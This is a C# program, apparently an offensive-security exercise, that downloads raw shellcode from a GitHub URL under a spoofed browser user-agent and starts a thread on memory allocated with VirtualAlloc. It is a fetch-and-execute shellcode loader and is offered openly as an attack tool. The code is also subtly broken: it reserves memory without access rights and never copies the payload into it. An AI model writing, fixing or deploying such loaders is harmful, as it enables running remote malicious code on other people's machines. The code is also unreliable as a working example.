using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace ShellFetchRun
{
    class Program
    {

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        };

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, ulong flAllocationType, ulong flProtect);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern uint CreateThread(SECURITY_ATTRIBUTES lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, ulong dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            SECURITY_ATTRIBUTES Security_Attributes = new SECURITY_ATTRIBUTES();
            WebClient client = new WebClient();
            
            client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75");
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            Stream data = client.OpenRead("https://raw.githubusercontent.com/Nihardobariya/offensive_cs/main/shellcode.raw");
            StreamReader reader = new StreamReader(data);
            
            string s = reader.ReadToEnd();
            //byte[] arry = Convert.FromBase64String(s);

            Console.WriteLine(s);
            //Console.WriteLine(BitConverter.ToString(arry));


            data.Close();
            reader.Close();

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)s.Length, 0x00002000, 0);

            uint temp = CreateThread(Security_Attributes, (uint)s.Length, addr, IntPtr.Zero, 0, IntPtr.Zero);

        }
    }
}
